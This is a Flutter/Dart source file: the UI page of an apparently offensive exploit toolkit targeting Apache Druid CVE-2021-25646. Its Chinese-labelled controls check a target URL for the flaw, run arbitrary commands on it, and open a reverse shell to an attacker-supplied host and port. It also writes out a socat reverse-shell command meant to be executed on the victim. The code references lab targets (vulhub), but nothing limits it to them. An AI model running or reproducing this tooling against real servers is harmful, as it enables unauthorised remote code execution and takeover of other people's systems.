import 'package:flutter/material.dart';

import '../../app/constants.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../services/reverse_shell_service.dart';
import '_vulhub_page_helpers.dart';
import 'base_vulhub_exp_page.dart';
import '../reverse_shell_terminal_page.dart';

class DruidExpPage extends BaseVulhubExpPage {
  const DruidExpPage({super.key});

  @override
  State<DruidExpPage> createState() => _DruidPageState();
}

class _DruidPageState extends BaseVulhubExpPageState<DruidExpPage> {
  @override
  IconData get pageIcon => Icons.data_object;

  @override
  String get appBarTitle => 'Apache Druid CVE-2021-25646 嵌入式 JavaScript RCE';

  @override
  String get cardTitle => 'Apache Druid CVE-2021-25646';

  @override
  String get cardSubtitle => 'Sampler 接口强制执行用户提供的 JavaScript 代码，影响 <= 0.20.0';

  final _urlCtrl = TextEditingController();
  final _cmdCtrl = TextEditingController(text: 'id');
  final _lhostCtrl = TextEditingController();
  final _lportCtrl = TextEditingController(text: '4444');
  final _timeoutCtrl = TextEditingController();
  final ReverseShellService _rs = ReverseShellService();

  @override
  void initState() {
    super.initState();
    _rs.loadConfig().then((_) {
      if (!mounted) return;
      _lhostCtrl.text = _rs.lhost;
      _lportCtrl.text = _rs.lport.toString();
    });
  }

  DruidExpService _svc() => DruidExpService(
        baseUrl: _urlCtrl.text.trim(),
        timeout: Duration(seconds: timeoutFrom(_timeoutCtrl)),
      );

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    setState(() => running = true);
    appendLog('[*] 检测 CVE-2021-25646...');
    try {
      final r = await _svc().check();
      appendLog(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到漏洞');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _exec() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final cmd = _cmdCtrl.text.trim().isEmpty ? 'id' : _cmdCtrl.text.trim();
    setState(() => running = true);
    appendLog('[*] 执行命令: $cmd');
    try {
      final out = await _svc().execRce(cmd);
      appendLog(out != null && out.isNotEmpty ? '[+] 输出:\n$out' : '[-] 无输出或执行失败');
    } catch (e) {
      appendLog('[!] 异常: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  Future<void> _showReverseShellDialog() async {
    if (_urlCtrl.text.trim().isEmpty) {
      appendLog('[!] 请输入目标 URL');
      return;
    }
    final mode = await showReverseShellModeDialog(context);
    if (mode == null) return;

    final lhost = _lhostCtrl.text.trim();
    final lport = int.tryParse(_lportCtrl.text.trim()) ?? 4444;
    if (lhost.isEmpty || lport <= 0 || lport > 65535) {
      appendLog('[!] LHOST/LPORT 无效');
      return;
    }

    _rs.lhost = lhost;
    _rs.lport = lport;
    _rs.saveConfig();

    if (!mounted) return;
    final nav = Navigator.of(context);
    _rs.onSession = (session) {
      session.label = 'Druid-CVE-2021-25646';
      if (!mounted) return;
      nav.push(
        MaterialPageRoute(builder: (_) => ReverseShellTerminalPage(session: session)),
      );
    };

    setState(() => running = true);
    appendLog('[*] 启动完整终端监听: $lhost:$lport ($mode)');
    try {
      await _rs.startListening(port: lport);

      if (mode == 'socat') {
        final cmd =
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:$lport";
        appendLog('[i] 在目标执行 socat 命令建立连接:');
        appendLog(cmd);
        if (mounted) {
          await showDialog<void>(
            context: context,
            builder: (_) => AlertDialog(
              title: const Text('socat 反弹命令'),
              content: SelectableText(cmd),
              actions: [
                TextButton(
                  onPressed: () => Navigator.of(context).pop(),
                  child: const Text('关闭'),
                ),
              ],
            ),
          );
        }
      } else {
        final ok = await _svc().startReverseShell(
          lhost,
          lport,
          preferScript: mode == 'script',
        );
        appendLog(ok ? '[+] 已发送反弹 shell，等待连接...' : '[-] 发送失败');
      }
    } catch (e) {
      appendLog('[!] 启动失败: $e');
    } finally {
      if (mounted) setState(() => running = false);
    }
  }

  @override
  void dispose() {
    _urlCtrl.dispose();
    _cmdCtrl.dispose();
    _lhostCtrl.dispose();
    _lportCtrl.dispose();
    _timeoutCtrl.dispose();
    super.dispose();
  }

  @override
  Widget buildLeftPanel(BuildContext context) {
    return SingleChildScrollView(
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          vSecTitle('目标配置'),
          vTf(_urlCtrl, '目标 URL', 'http://localhost:8080'),
          const SizedBox(height: 8),
          vTf(
            _timeoutCtrl,
            '超时(s)',
            '${AppConstants.defaultHttpTimeoutSeconds}',
            type: TextInputType.number,
          ),
          const SizedBox(height: 8),
          vBtn('检测漏洞', running ? null : _check),
          const SizedBox(height: 16),
          vSecTitle('命令执行'),
          vTf(_cmdCtrl, '命令', 'id'),
          const SizedBox(height: 8),
          vBtn('执行命令', running ? null : _exec),
          const SizedBox(height: 16),
          vSecTitle('GetShell（反弹 Shell）'),
          vTf(_lhostCtrl, '攻击机 IP', '127.0.0.1'),
          const SizedBox(height: 8),
          vTf(_lportCtrl, '攻击机端口', '4444', type: TextInputType.number),
          const SizedBox(height: 8),
          vBtn('完整终端（反弹Shell）', running ? null : _showReverseShellDialog),
        ],
      ),
    );
  }
}
